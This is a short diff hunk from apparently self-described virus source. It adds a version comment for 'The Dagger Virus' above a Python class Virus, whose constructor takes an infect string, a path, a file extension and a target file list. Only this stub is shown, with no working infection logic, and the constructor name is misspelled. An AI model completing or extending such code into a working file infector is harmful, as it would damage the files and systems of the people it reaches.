@@ -1,3 +1,4 @@
+#version 0.1 (first version of The Dagger Virus)
 class Virus:
     def __init_(self, infect_string=None, path=None,   \
                         extension=None, target_file_list=None):
